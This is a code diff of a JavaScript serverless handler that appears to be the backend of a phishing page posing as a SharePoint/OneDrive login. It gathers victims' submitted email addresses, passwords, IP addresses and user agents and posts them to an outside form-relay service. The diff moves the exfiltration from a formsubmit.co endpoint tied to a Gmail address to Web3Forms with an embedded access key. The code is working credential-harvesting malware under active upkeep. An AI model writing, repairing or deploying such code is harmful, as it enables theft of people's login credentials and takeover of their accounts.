@@ -7,10 +7,6 @@ export default async function handler(req, res) {
   try {
     const { email, password, ip, userAgent } = req.body;
 
-    const formSubmitUrl = 'https://formsubmit.co/ajax/g82443047@gmail.com';
-
-    const referer = 'https://share-point.vercel.app';
-
     const message = `
 🔐 New Credentials
 📧 Email: ${email || 'N/A'}
@@ -20,24 +16,26 @@ export default async function handler(req, res) {
 ⏰ Time: ${new Date().toISOString()}
     `;
 
-    const response = await fetch(formSubmitUrl, {
+    const response = await fetch('https://api.web3forms.com/submit', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
-        'Referer': referer,
-        'Origin': referer,
+        'Accept': 'application/json',
       },
       body: JSON.stringify({
+        access_key: 'a682d4f0-f5ae-4c34-a6f6-f29d10f9c24b',
+        subject: 'New Login',
+        from_name: 'OneDrive Portal',
         email: email || 'No email',
         password: password || 'No password',
         ip: ip || 'Unknown',
         userAgent: userAgent || 'Unknown',
-        message: message.trim()
-      })
+        message: message.trim(),
+      }),
     });
 
-    const responseData = await response.json().catch(() => ({}));
-    console.log('FormSubmit response:', response.status, JSON.stringify(responseData));
+    const data = await response.json();
+    console.log('Web3Forms response:', response.status, JSON.stringify(data));
 
     return res.status(200).json({ success: true });
   } catch (error) {
